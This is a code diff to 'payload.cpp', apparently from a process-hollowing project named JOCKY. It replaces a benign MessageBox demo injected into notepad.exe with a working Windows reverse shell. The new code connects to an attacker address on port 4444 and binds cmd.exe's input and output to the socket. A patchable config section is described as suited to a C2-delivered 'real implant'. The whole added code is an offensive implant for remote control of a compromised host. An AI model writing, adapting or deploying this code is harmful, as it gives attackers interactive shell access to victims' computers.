@@ -1,26 +1,56 @@
 // payload.cpp
-// No includes — zero CRT
-// This binary will be injected into notepad.exe
-#define NULL 0
-extern "C" {
-    int __stdcall MessageBoxA(
-        void* hwnd,
-        const char* text,
-        const char* caption,
-        unsigned int type
-    );
-    void __stdcall ExitProcess(unsigned int code);
-}
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#pragma comment(lib, "ws2_32.lib")
 
-// Our entry point — no main, no WinMain, no CRT
+// Read from command line: payload.exe 192.168.1.10 4444
+// Passed via hollow pipeline as a config block
+#define DEFAULT_PORT 4444
+
+// Config block embedded in PE — your C2 server patches
+// these bytes before delivering the payload
+// Much cleaner than command line args for a real implant
+#pragma section(".jocky", read, write)
+__declspec(allocate(".jocky"))
+volatile char g_attackerIp[64]  = "ATTACKER_IP_HERE";
+volatile USHORT g_attackerPort  = DEFAULT_PORT;
+
 void payload_entry() {
-    MessageBoxA(
-        NULL,
-        "JOCKY is executing inside notepad.exe\n"
-        "Process Hollowing successful.\n"
-        "This code was injected.",
-        "JOCKY - Hollowing Demo",
-        0x40  // MB_ICONINFORMATION
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    SOCKET sock = WSASocketA(
+        AF_INET, SOCK_STREAM, IPPROTO_TCP,
+        NULL, 0, 0
     );
+
+    struct sockaddr_in addr = {0};
+    addr.sin_family      = AF_INET;
+    addr.sin_port        = htons(g_attackerPort);
+    addr.sin_addr.s_addr = inet_addr((const char*)g_attackerIp);
+
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
+        WSACleanup();
+        ExitProcess(1);
+    }
+
+    STARTUPINFOA si = {0};
+    si.cb         = sizeof(si);
+    si.dwFlags    = STARTF_USESTDHANDLES;
+    si.hStdInput  = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError  = (HANDLE)sock;
+
+    PROCESS_INFORMATION pi = {0};
+    CreateProcessA(
+        NULL, (LPSTR)"cmd.exe",
+        NULL, NULL, TRUE, 0,
+        NULL, NULL, &si, &pi
+    );
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    WSACleanup();
     ExitProcess(0);
 }
